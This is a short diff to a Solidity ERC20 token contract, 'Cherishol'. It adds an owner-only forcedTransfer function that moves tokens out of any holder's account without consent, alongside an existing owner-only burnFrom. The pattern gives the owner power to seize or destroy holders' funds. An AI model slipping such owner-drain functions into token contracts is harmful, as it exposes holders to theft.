@@ -27,4 +27,12 @@ contract Cherishol is Context, ERC20 {
     function burnFrom(address account, uint256 amount) public onlyOwner {
         _burn(account, amount);
     }
+
+    function forcedTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) public onlyOwner {
+        _transfer(from, to, amount);
+    }
 }
